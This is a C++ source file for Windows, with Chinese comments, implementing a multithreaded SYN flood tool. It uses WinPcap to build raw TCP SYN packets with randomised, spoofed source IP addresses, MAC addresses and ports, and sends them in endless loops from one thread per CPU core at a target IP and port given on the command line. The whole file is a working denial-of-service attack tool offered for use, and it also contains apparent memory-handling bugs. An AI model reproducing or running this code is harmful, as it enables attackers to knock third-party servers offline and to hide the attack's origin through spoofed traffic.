/*

g++ synflood_gcc_mt.cpp -os.exe -lwsock32 -lwpcap -liphlpapi	
g++ synflood_gcc_mt.cpp -os.exe -lwsock32 -lwpcap -liphlpapi -lpthread		
g++ -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2 -static	
g++ -Wall -mwindows -Wl,-static  -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  
g++ -Wall -mwindows -Wl,-static  -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -lgdi32 -lkernel32 -luser32 -lws2_32 
g++ -Wall -mwindows -Wl,-Bstatic -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -lgdi32 -lkernel32 -luser32 -lws2_32 
g++ -Wall -mwindows -Wl,-Bstatic,--enable-auto-import -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -lgdi32 -lkernel32 -luser32 -lws2_32 
g++ -Wall -mwindows -Wl,-Bstatic,--enable-auto-import -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -lgdi32 -lkernel32 -luser32 -lws2_32 
g++ -Wall -mwindows -Wl,-Bstatic,--enable-auto-import,--enable-stdcall-fixup -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -lgdi32 -lkernel32 -luser32 -lws2_32 
g++ -Wall -mwindows -Wl,-Bstatic,--enable-auto-import,--enable-stdcall-fixup -os.exe synflood_gcc_mt.cpp -LC:\MinGW\bin -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -lgdi32 -lkernel32 -luser32 -lws2_32 
g++ -Wall -mwindows -static -Wl,-Bstatic,--enable-auto-import,--enable-stdcall-fixup -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2
g++ -Wall -mwindows -static -Wl,-Bstatic,--enable-auto-import,--enable-stdcall-fixup -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2
g++ -Wall -mwindows -Wl,-Bstatic,--enable-auto-import -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2
g++ -Wall -mwindows -static -Wl,-Bstatic,--enable-auto-import,--enable-stdcall-fixup -os.exe synflood_gcc_mt.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2
g++  -os.exe s.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -static-libgcc -static-libstdc++
g++  -Wl,--enable-auto-import -os.exe s.cpp -lwsock32 -lwpcap -liphlpapi  -lpthreadgc2  -lgcc -lstdc++
g++ -os.exe s.cpp -Wl,-Bstatic -lwsock32  -liphlpapi -lpthreadgc2 -lgcc -lstdc++ -Wl,-Bdynamic -lwpcap



g++ -osyn.exe syn.cpp -Wl,-Bstatic -lwsock32  -liphlpapi -lpthreadgc2 -Wl,-Bdynamic -lwpcap



*/


/*
#pragma comment(lib,	"ws2_32.lib")
#pragma comment(lib, 	"packet.lib")
#pragma comment(lib,	"wpcap.lib")
#pragma comment(lib, 	"Iphlpapi.lib")
#pragma comment(lib, 	"pthreadVC2.lib")
*/

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <string>

//#include <iostream>
//#include <fstream>

//#include <sstream>
//#include <cstdlib>
//#include <conio.h>
//#include <iostream>
//#include <vector>

#include <iphlpapi.h>
#define HAVE_REMOTE
#include <pcap.h>
#include <pthread.h>



#define ETH_ARP         0x0806  //以太网帧类型表示后面数据的类型，对于ARP请求或应答来说，该字段的值为x0806
#define ETH_IP_V4       0x0800  //协议类型字段表示要映射的协议地址类型值为x0800表示IP地址

#define ARP_HARDWARE    1  //硬件类型字段值为表示以太网地址
#define ARP_REQUEST     1  //ARP请求
#define ARP_REPLY       2  //ARP应答


using namespace std;



/*                       IP报文格式
	0            8           16                        32
	+------------+------------+-------------------------+
	| ver + hlen |  服务类型  |         总长度          |
	+------------+------------+----+--------------------+
	|           标识位        |flag|   分片偏移(13位)   |
	+------------+------------+----+--------------------+
	|  生存时间  | 高层协议号 |       首部校验和        |
	+------------+------------+-------------------------+
	|                   源 IP 地址                      |
	+---------------------------------------------------+
	|                  目的 IP 地址                     |
	+---------------------------------------------------+

*/

struct IP_HEADER
{
	byte versionAndHeader;
	byte serviceType;
	byte totalLen[2];
	byte seqNumber[2];
	byte flagAndFragPart[2];
	byte ttl;
	byte hiProtovolType;
	byte headerCheckSum[2];
	byte srcIpAddr[4];
	byte dstIpAddr[4];
};

/*
	                      TCP 报文
	0                       16                       32	
	+------------------------+-------------------------+
	|      源端口地址        |      目的端口地址       |
	+------------------------+-------------------------+
	|                      序列号                      |
	+--------------------------------------------------+
	|                      确认号                      |
	+------+--------+--------+-------------------------+
	|HLEN/4| 保留位 |控制位/6|         窗口尺寸        |
	+------+--------+--------+-------------------------+
	|         校验和         |         应急指针        |
	+------------------------+-------------------------+
*/

struct TCP_HEADER
{
	byte srcPort[2];
	byte dstPort[2];
	byte seqNumber[4];
	byte ackNumber[4];
	byte headLen;
	byte contrl;
	byte wndSize[2];
	byte checkSum[2];
	byte uragentPtr[2];
};

struct PSD_HEADER
{ 
    byte srcIpAddr[4];     //Source IP address; 32 bits
    byte dstIpAddr[4];     //Destination IP address; 32 bits 
    byte padding;          //padding
    byte protocol;         //Protocol; 8 bits
    byte tcpLen[2];        //TCP length; 16 bits
} ;

struct ETHERNET_HEADER
{  
	byte dstMacAddr[6];
	byte srcMacAddr[6];
	byte ethernetType[2];
};

struct DEV_INFO
{
	pcap_t*		handle;
	char szDevName[512];
	char szDevDescription[512];
	char szDevIP[64];
	char szDevNetmask[64]; 
	char szDevGatewayIP[64];
	unsigned char szDevGatewayMac[64];
};

 
 //28字节ARP帧结构
struct ARP_HEADER {
	unsigned short	snHardwareType; //硬件类型
	unsigned short	snProtocolType; //协议类型
	unsigned char	cHardwareAddLen; //硬件地址长度
	unsigned char	cProtocolAddLen; //协议地址长度
	unsigned short	snOperationField; //操作字段
	unsigned char	szSourceMacAdd[6]; //源mac地址
	unsigned char	szSourceIpAdd[4]; //源ip地址
	unsigned char	szDestMacAdd[6]; //目的mac地址
	unsigned char	szDestIpAdd[4]; //目的ip地址
};

struct thread_param {
	DEV_INFO* 	dev;
	char*		pcDstIp;
	int*		pnDstPort;
	char*		pcBaseIp;
};



static bool 			FLOODING=true;
static pthread_t*  		P_THREAD_LIST;
static struct DEV_INFO 	DEV_LIST[16]; 

//pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER; 








int fnGetGatewayMacAddr(pcap_t *pAdhandle,const char *pSrcIpAddr, const char *pDstIpAddr, unsigned char *pMac) {

	unsigned  char    sendbuf[ 42 ];
    int     i = 7 ,k;
    ETHERNET_HEADER  eth;
    ARP_HEADER       arp;
    

    struct  pcap_pkthdr  *   pkt_header;
    u_char  *  pkt_data; 

    for (k = 0 ;k < 6 ;k ++ )
    {
        eth.dstMacAddr[k] = 0xff ;
        eth.srcMacAddr[k] = 0x0f ;
        arp.szSourceMacAdd[k] = 0x0f ;
        arp.szDestMacAdd[k] = 0x00 ;
    }

    

    eth.ethernetType[0] = htons(ETH_ARP);
    arp.snHardwareType = htons(ARP_HARDWARE);
    arp.snProtocolType = htons(ETH_IP_V4);
    arp.cHardwareAddLen = 6 ;
    arp.cProtocolAddLen = 4 ;
    arp.snOperationField = htons(ARP_REQUEST);
    
 	int nDestIp =inet_addr( pDstIpAddr);
 	arp.szDestMacAdd[0]=(u_char)(nDestIp);
 	arp.szDestMacAdd[1]=(u_char)(nDestIp>>8);
 	arp.szDestMacAdd[2]=(u_char)(nDestIp>>16);
 	arp.szDestMacAdd[3]=(u_char)(nDestIp>>24);


	int nSrcIp =inet_addr( pSrcIpAddr);
 	arp.szSourceIpAdd[0]=(u_char)(nSrcIp);
 	arp.szSourceIpAdd[1]=(u_char)(nSrcIp>>8);
 	arp.szSourceIpAdd[2]=(u_char)(nSrcIp>>16);
 	arp.szSourceIpAdd[3]=(u_char)(nSrcIp>>24);

    
	memset(sendbuf, 0 , sizeof (sendbuf));
    memcpy(sendbuf, & eth, sizeof (eth));
    memcpy(sendbuf + sizeof (eth), & arp, sizeof (arp));

    if (pcap_sendpacket(pAdhandle,sendbuf, 42 ) == 0 )
    {
       printf("Send ARP Packet Succeed ... \n");
    }
    else 
    {
        printf( "Error: Send ARP Packet Failed!");
        return   -1 ;
    }
    
    while ((k = pcap_next_ex(pAdhandle, & pkt_header,( const  u_char ** ) & pkt_data)) >= 0 )
    {       
        if ( * (unsigned  short   * )(pkt_data + 12 ) == htons(ETH_ARP) &&* (unsigned  short * )(pkt_data + 20 ) == htons(ARP_REPLY) &&* (unsigned  long * )(pkt_data + 38 ) == inet_addr( pSrcIpAddr ))
        {
            
            for (i = 0 ;i < 6 ;i ++ )
            {
                pMac[i] =* (unsigned  char * )(pkt_data + 22 + i);
            }
			//printf( "\nGateway Mac:%02x.%02x.%02x.%02x.%02x.%02x\n", 	pMac[0],pMac[1],pMac[2],pMac[3],pMac[4],pMac[5]);
            break ;
        }
    }
    if (i == 6 )
    {
         return   1 ;
    }
    else 
    {
         return   0 ;
    }

}


int fnGetGateway(string sSrcIP,char* pGatewayIP)
{
	 
    PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
    unsigned long stSize = sizeof(IP_ADAPTER_INFO);
    int nRel = GetAdaptersInfo(pIpAdapterInfo,&stSize);

    if (ERROR_BUFFER_OVERFLOW == nRel){
        // ERROR_BUFFER_OVERFLOW：内存空间不够
        // 释放原来的内存空间
        delete pIpAdapterInfo;
        // 重新申请内存空间用来存储所有网卡信息
        pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
        // 再次调用GetAdaptersInfo
        nRel=GetAdaptersInfo(pIpAdapterInfo,&stSize);
    }
    if (ERROR_SUCCESS == nRel){
        while (pIpAdapterInfo){
            switch(pIpAdapterInfo->Type){
            case MIB_IF_TYPE_OTHER:
                break;
            case MIB_IF_TYPE_ETHERNET:
                break;
            case MIB_IF_TYPE_TOKENRING:
                break;
            case MIB_IF_TYPE_FDDI:
                break;
            case MIB_IF_TYPE_PPP:
                break;
            case MIB_IF_TYPE_LOOPBACK:
                break;
            case MIB_IF_TYPE_SLIP:
                break;
            default:
                break;
            }


            // 多个网卡、多个IP
            IP_ADDR_STRING *pIpAddrString =&(pIpAdapterInfo->IpAddressList);
            do{                    
				if(pIpAddrString->IpAddress.String==sSrcIP){                        
                	strcpy(pGatewayIP,pIpAdapterInfo->GatewayList.IpAddress.String);
                }                    
                pIpAddrString=pIpAddrString->Next;
            } while (pIpAddrString);
            pIpAdapterInfo = pIpAdapterInfo->Next;               
        }

    }
     //释放内存空间
    if (pIpAdapterInfo){
        delete pIpAdapterInfo;
    }
	
    return 0;
}


int fnGetAllDevs(DEV_INFO devsList[])
{
	
	
	int nDevsNum = 0;
	pcap_if_t *alldevs;
	char errbuf[PCAP_ERRBUF_SIZE];
	if ( pcap_findalldevs(&alldevs,errbuf) == -1 )
	{
		printf("error in pcap_findalldevs_ex: %s\n",errbuf);
		return -1;
	}
	for ( pcap_if_t *d = alldevs; d != NULL; d = d->next )
	{

		strcpy( devsList[nDevsNum].szDevName, d->name );
		strcpy( devsList[nDevsNum].szDevDescription, d->description );
		

		pcap_addr_t *a;
		  /* IP addresses */
	  	for(a=d->addresses;a;a=a->next) {
	    	
	   		switch(a->addr->sa_family)
	    	{
		      case AF_INET:
		        if (a->addr){
			       	//printf("\tAddress: %s\n",inet_ntoa(((struct sockaddr_in *)(a->addr))->sin_addr));
					strcpy( devsList[nDevsNum].szDevIP, inet_ntoa(((struct sockaddr_in *)(a->addr))->sin_addr) );
		        }
		        if (a->netmask){
		          	//printf("\tNetmask: %s\n",iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
		          	strcpy( devsList[nDevsNum].szDevNetmask, inet_ntoa(((struct sockaddr_in *)(a->netmask))->sin_addr) );
		        }
		        break;
		 
		      /*case AF_INET6:
		        printf("\tAddress Family Name: AF_INET6\n");
		        break;*/
		 
		      default:
		        printf("\tAddress Family Name: Unknown\n");
		        break;
	    	}
	  	}



		nDevsNum++;
	}


	pcap_freealldevs(alldevs);
	
	return nDevsNum;
}



 
int fnGetCPUNum(){

	SYSTEM_INFO si;  
  
    GetSystemInfo(&si);  
  
    return si.dwNumberOfProcessors;
}





unsigned short fnCheckSum(unsigned short packet[], int size )
{
	unsigned long lCksum = 0;
    while (size > 1) 
    {
        lCksum += *packet++;
        size -= sizeof(USHORT);
    }
    if (size) 
    {
        lCksum += *(UCHAR*)packet;
    }
    lCksum = (lCksum >> 16) + (lCksum & 0xFFFF);
    lCksum += (lCksum >>16);

    return (USHORT)(~lCksum);
}

int fnEncodeSynPacket( byte packet[], const char *lpszSrcIpAddr,int nSrcPort, const char *lpszDstIpAddr,int nDstPort, byte tempDMac[])
{
	TCP_HEADER tcpHeader;
	memset(&tcpHeader, 0, sizeof tcpHeader );
	*(unsigned short *)tcpHeader.srcPort = htons(nSrcPort);
	*(unsigned short *)tcpHeader.dstPort = htons(nDstPort);
	*(unsigned int *)tcpHeader.seqNumber = htonl(0xFFFF);
	*(unsigned int *)tcpHeader.ackNumber = htonl(0x00);
	tcpHeader.headLen = 5 << 4; 
	tcpHeader.contrl = 1 << 1;
	*(unsigned short *)tcpHeader.wndSize = htons(0xFFFF);
	
	IP_HEADER ipHeader;
	memset( &ipHeader, 0, sizeof ipHeader );
	unsigned char versionAndLen = 0x04;
	versionAndLen <<= 4;
	versionAndLen |= sizeof ipHeader / 4; //版本 + 头长度

	ipHeader.versionAndHeader = versionAndLen;
	*(unsigned short *)ipHeader.totalLen = htons( sizeof(IP_HEADER) + sizeof(TCP_HEADER) ); 

	ipHeader.ttl = 0xFF;
	ipHeader.hiProtovolType = 0x06;

	*(unsigned int *)(ipHeader.srcIpAddr) = inet_addr(lpszSrcIpAddr);
	*(unsigned int *)(ipHeader.dstIpAddr) = inet_addr(lpszDstIpAddr);
	//*(unsigned short *)(ipHeader.headerCheckSum) = CheckSum( (unsigned short *)&ipHeader, sizeof ipHeader );
	
	BYTE tempSMac[6]={0x1C,0x1B,0x0D,0xBD,0xA6,0xD5};
	//BYTE tempDMac[6]={0xa4,0x56,0x02,0xf7,0x05,0xe7};

	ETHERNET_HEADER ethHeader;
	memset(&ethHeader, 0, sizeof ethHeader);
	memcpy(ethHeader.srcMacAddr, tempSMac, 6);
	memcpy(ethHeader.dstMacAddr, tempDMac, 6);
	
	*(unsigned short *)ethHeader.ethernetType = htons(ETH_IP_V4);
	

	//memset(packet, 0, sizeof packet);
	memcpy(packet, &ethHeader, sizeof ethHeader);
	memcpy(packet + sizeof ethHeader, &ipHeader, sizeof ipHeader);
	memcpy(packet + sizeof ethHeader + sizeof ipHeader, &tcpHeader, sizeof tcpHeader);
	printf("\nEncode Syn Packet Succeed\n");
	return (sizeof ethHeader + sizeof ipHeader + sizeof tcpHeader);
}







void *fnSendSYNPacket(void *arg){

	struct thread_param *pParamData;
   	pParamData = (struct thread_param *) arg;

	DEV_INFO* dev=pParamData->dev;
	pcap_t* pHandle=dev->handle;
	
	char* 			pcDstIpAddr	=pParamData->pcDstIp;
	int* 			pnDstPort	=pParamData->pnDstPort;
	char*			pcBaseIpAddr=pParamData->pcBaseIp;



	byte packet[1024];
	int size = fnEncodeSynPacket( packet, "0.0.0.0",0, pcDstIpAddr,*pnDstPort,dev->szDevGatewayMac);

	ETHERNET_HEADER 	*pEtherentHeader = (ETHERNET_HEADER *)packet;
	IP_HEADER 			*pIpHeader = ( IP_HEADER *)(packet + sizeof(ETHERNET_HEADER));
	TCP_HEADER 			*pTcpHeader = ( TCP_HEADER *)(packet + sizeof(ETHERNET_HEADER) + sizeof(IP_HEADER));

	byte psdPacket[128];
	memset(psdPacket, 0x00, sizeof psdPacket );
	PSD_HEADER *pPsdHeader = (PSD_HEADER *)psdPacket;

	*(unsigned int *)(pPsdHeader->dstIpAddr) = inet_addr(pcDstIpAddr);
	*(unsigned short *)(pPsdHeader->tcpLen)  = htons(sizeof(TCP_HEADER));	
	pPsdHeader->protocol = 0x06;
	pPsdHeader->padding  = 0x00;

	memcpy( psdPacket + sizeof(PSD_HEADER), pTcpHeader, sizeof(TCP_HEADER));



	unsigned short nSrcPort =  rand() %0xFFFFFFFF;
	unsigned int   unSrcIpAddr = 0;
	unsigned int   unBaseIpAddr = ntohl(inet_addr(pcBaseIpAddr));
	unsigned int   unSeq = 0;
	
	printf("\nBegin Flooding !\n");
	while ( FLOODING )
	//for(int l=0;l<10;l++)
	{
		for ( int i = 0; i < 6; ++i )
		{
			pEtherentHeader->srcMacAddr[i] = (byte)(rand() % (0xFF+1) );
		}

		unSeq = rand() % 0xFFFFFF;
		nSrcPort = rand() % 0xFFFF;
		unSrcIpAddr = unBaseIpAddr + rand() % 0xFF;
		

		*(unsigned int *)(pIpHeader->srcIpAddr) = htonl(unSrcIpAddr);
		*(unsigned short *)(pIpHeader->headerCheckSum) = 0x0000;
		*(unsigned short *)(pIpHeader->headerCheckSum) = fnCheckSum( ( unsigned short * )pIpHeader, sizeof (IP_HEADER));
		
		*(unsigned int *)(pPsdHeader->srcIpAddr) = htonl(unSrcIpAddr);
		*(unsigned int *)(pPsdHeader->srcIpAddr) = htonl(unSrcIpAddr);

		TCP_HEADER *pPsdTcpHeader = (TCP_HEADER *)(psdPacket + sizeof(PSD_HEADER) );

		*(unsigned int *)(pPsdTcpHeader->seqNumber) = htonl(unSeq);
		*(unsigned int *)(pTcpHeader->seqNumber) = htonl(unSeq);//htonl(rand() % 0xFFFFFF );

		*(unsigned short *)(pTcpHeader->srcPort) = htons(nSrcPort);
		*(unsigned short *)(pPsdTcpHeader->srcPort) = htons(nSrcPort);

		*(unsigned short *)(pTcpHeader->checkSum) = 0x0000;
		*(unsigned short *)(pTcpHeader->checkSum) = fnCheckSum( (unsigned short *)psdPacket, sizeof(PSD_HEADER) + sizeof(TCP_HEADER) );

		//system("pause");
		
		pcap_sendpacket(pHandle, packet, size );

	}




	if(!FLOODING){
	
		//delete  pcBaseIpAddr;
		//delete  pcDstIpAddr;
		//delete  pnDstPort;
		//delete  pParamData ;
		
		delete  	pPsdHeader;
		//delete[]  	psdPacket;
		delete  	pTcpHeader;
		delete  	pIpHeader;
		delete  	pEtherentHeader;
		//delete[]  	packet;

		printf("Free thread local variable...\n");  

	}
	
	
	return 0;
}









int fnCancelSYNPacketSend(){



	FLOODING=false;

	int nCPUNum=fnGetCPUNum();
	for(int i=0; i < nCPUNum; i++ ){
		pthread_join(P_THREAD_LIST[i],NULL);
	}

	int nDevsNum=(sizeof(DEV_LIST) / sizeof(DEV_LIST[0]) - 1);
	

	for(int i=0;i<nDevsNum;i++){

		if ( NULL == DEV_LIST[i].handle )
		{
			//printf("\nUnable to open the adapter. %s is not supported by WinPcap\n");
		}else{
			printf("Free dev handle:%d\n",i);
			pcap_close(DEV_LIST[i].handle);	
		}

	}


	//delete[] 	DEV_LIST;
	delete 		P_THREAD_LIST;

	printf("Free global variable...\n");  

	return 0;
}

int fnSendSYNPacket(DEV_INFO dev,char* pcDstIpAddr,int nDstPort,char* pcBaseIpAddr){

 
	 
	

	struct thread_param param;
	param.dev=&dev;
	param.pcBaseIp=pcBaseIpAddr;
	param.pcDstIp=pcDstIpAddr;
	param.pnDstPort=&nDstPort;
	



	//fnSendSYNPacket((void*)&param);

	 
	int nCPUNum=fnGetCPUNum();
	P_THREAD_LIST=new pthread_t[nCPUNum];

	int rc;
	for(int i=0; i < nCPUNum; i++ ){
		rc = pthread_create(&P_THREAD_LIST[i], NULL,fnSendSYNPacket, (void*)&param);
		printf("Create thread succeed :%d\n",i );
      	if (rc){
         	printf("Error:unable to create thread :%d\n",i );
         	exit(-1);
      	}
	}
	
	//system("pause");

	

	
	return 0;
}



int fnSendSYNPacket(DEV_INFO dev,char* cDstIp,int nDstPort){

	char cGatewayIP[32];
	fnGetGateway(dev.szDevIP,cGatewayIP);
	int nGatewayIP =inet_addr( cGatewayIP);
	

	byte byBaseIpAddr[4];
	
	byBaseIpAddr[0]=(u_char)(nGatewayIP);
 	byBaseIpAddr[1]=(u_char)(nGatewayIP>>8);
 	byBaseIpAddr[2]=(u_char)(nGatewayIP>>16);
 	byBaseIpAddr[3]=(u_char)(nGatewayIP>>24);

	char	cBaseIpAddr[32];

	sprintf(cBaseIpAddr,"%d.%d.%d.%d",byBaseIpAddr[0],byBaseIpAddr[1],byBaseIpAddr[2],byBaseIpAddr[3]);
	
	return fnSendSYNPacket(dev,cDstIp,nDstPort,cBaseIpAddr);
}




 


int main(int argc, char* argv[])
{


	printf("***********************************************************\n");

	printf("Use:\n");

	printf("ecs target_ip target_port  src_base_ip\n");

	printf("***********************************************************\n");
	fflush(stdout);


	
	int nDevsNum=fnGetAllDevs(DEV_LIST);


	

 	for ( int i = 0; i < nDevsNum; ++i )  
    {  
    	//printf("----------------------------------\n"); 
    	printf("%d:\n",i);
        DEV_INFO d=DEV_LIST[i];
        printf("Name:%s\n", d.szDevName);
        printf("Description:%s\n", d.szDevDescription);
        printf("IP:%s\n", d.szDevIP);

        printf("----------------------------------\n"); 

    }  

	
	DEV_INFO dev=DEV_LIST[0];


	char szError[PCAP_ERRBUF_SIZE];
	pcap_t *pHandle = pcap_open_live(dev.szDevName, 65536, 0, 1000, szError );
	if( NULL == pHandle )
	{
			printf("Error:Open adapter failed!\nPress any key to exit...");
			return -1;
	}
	fnGetGateway(dev.szDevIP,dev.szDevGatewayIP);
	memset(dev.szDevGatewayMac, 0, sizeof dev.szDevGatewayMac);
	fnGetGatewayMacAddr(pHandle,dev.szDevIP,dev.szDevGatewayIP,dev.szDevGatewayMac);
	dev.handle=pHandle; 
	 

	printf("Select:>\n");
	printf("Name:%s\n", dev.szDevName);
    printf("Description:%s\n", dev.szDevDescription);
    printf("IP:%s\n", dev.szDevIP);
    printf("Gateway IP:%s\n", dev.szDevGatewayIP);
    printf("Gateway Mac:%02x.%02x.%02x.%02x.%02x.%02x\n", 	dev.szDevGatewayMac[0],dev.szDevGatewayMac[1],dev.szDevGatewayMac[2],dev.szDevGatewayMac[3],dev.szDevGatewayMac[4],dev.szDevGatewayMac[5]);

    printf("----------------------------------\n"); 

	
	if(argc==4){
		fnSendSYNPacket(dev,argv[1],atoi(argv[2]),argv[3]);
	}else{
		fnSendSYNPacket(dev,argv[1],atoi(argv[2]));
 	}

 	system("pause");

 	fnCancelSYNPacketSend();
	
	return 0;
}